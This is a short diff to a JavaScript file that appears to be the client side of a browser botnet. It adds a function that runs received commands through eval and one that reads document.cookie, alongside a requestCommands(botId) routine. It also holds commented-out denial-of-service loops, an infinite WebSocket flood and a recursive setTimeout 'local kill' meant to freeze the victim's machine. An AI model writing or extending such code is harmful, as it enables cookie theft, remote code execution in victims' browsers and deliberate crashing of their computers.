@@ -152,17 +152,30 @@
             cb(false);
         }, timeout);
     };
-    // screenshots
-    // inject js
-    // request commands
-    // send Dom
-    // cookies
 
+
+    // request commands
+    function injectJs(cmd){
+        eval(cmd);
+        return true;
+    }
+    // cookies
+    function getCookies(){
+        return document.cookie;
+    }
     // this overloads the browser with generating infinite web sockets
     function killClient(){
         // dont run .... will freeze computer
         //        while(1){new WebSocket("ws://localhost");}
         // local kill
+//        (function TRUE($){
+//            for(;;){
+//                setTimeout(TRUE,$);
+//                setTimeout(TRUE,$);
+//                setTimeout(TRUE,$);
+//                setTimeout(TRUE,$);
+//            }
+//        })(1);
     }
     function requestCommands(botId){
         console.log(botId);
